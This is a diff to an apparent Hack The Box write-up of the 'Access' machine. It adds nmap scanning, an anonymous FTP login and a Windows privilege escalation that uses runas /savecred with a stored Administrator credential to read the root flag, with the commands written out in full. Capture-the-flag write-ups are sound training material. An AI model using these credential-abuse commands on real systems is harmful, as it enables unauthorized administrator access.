@@ -3,8 +3,7 @@ After accessing to http://10.10.10.98/ we get a picture of servers and a title n
 Searching in the internet for the name results in a server name. Basically, we have nothing else in the webiste.
 The source code is empty.
 
-
-
+First thing we do is to scan our address for open ports with nmap. We find that ports 23 and 21 are open. In addition, nmap indicates that anonymous login is enabled for the ftp server. So we login and wallah, there are 2 files! I tried to download the the second file (from Engineer folder). It was broken.
 Okay, so after searching on the internet, I've figured that the default download way for my ftp client ('ftp' in debian) is ASCII where is the targeted file should be downloaded as binary. 
 ```ftp> lcd /root/Documents
 Local directory now /root/Documents  //Desired destination on local machine
@@ -87,8 +86,29 @@ Now we have the email file itself. It contains a username and a password. It's p
 C:\Users\security\Desktop>type user.txt
 ***
 ```
-we also have a password for root.txt.
-From here, I was stuck, so I took a few hints from hackthebox.eu. As it seems, there is a program called cmdkey.exe which stores all domain user credentials for use on a specific target machines. 
+This file has the user flag. We owned user. Now to root:
+This took me a few hours, as I don't have expirience with windows. I got a few hints for hackthebox.eu and understood the following:
+cmdkey /list allows us the see the credentials stored in the computer. THey might be only for one session or forever. This basially allows the run files with credentials without entering the password each time. running cmdkey /list shows that the password for administrator user is stored. That allows us the run files with admin privilege, in other words: we have a huge vulnerability.
+The trick here is to copy the contents of root.txt file to security's folder.
+We don't know where is root.txt file is, so we will first find it. We will use the function 'runas' which allows us to run programs with different profiles:
+```
+C:\Users\security\Desktop>runas /user:ACCESS\Administrator /savecred "c:\windows\system32\cmd.exe /c dir c:\users\administrator\ /s /b>c:\users\security\desktop\files.txt"
+```
+/savecred allows us to bypass the password promptt and use admin's credentials. We run cmd.exe with admin prevs and copy all files & folders addresses into files.txt file. We want to find root.txt now:
+```
+C:\Users\security\Desktop>type files.txt | find "root.txt"
+c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\root.txt.lnk
+c:\users\administrator\Desktop\root.txt
+```
+Okay, it's in desktop. Now we will copy the contents of it into a file which is in security's desktop:
+```
+C:\Users\security\Desktop>runas /user:ACCESS\Administrator /savecred "c:\windows\system32\cmd.exe /c type c:\users\administrator\desktop\root.txt>c:\users\security\desktop\root.txt"
+```
+The flag is now in root.txt. We owned root.
+
+*I read that there are additional methods involving metasploit, maybe I will add these later on when I will gain more knowledge in windows*
+
+```
 
 
 
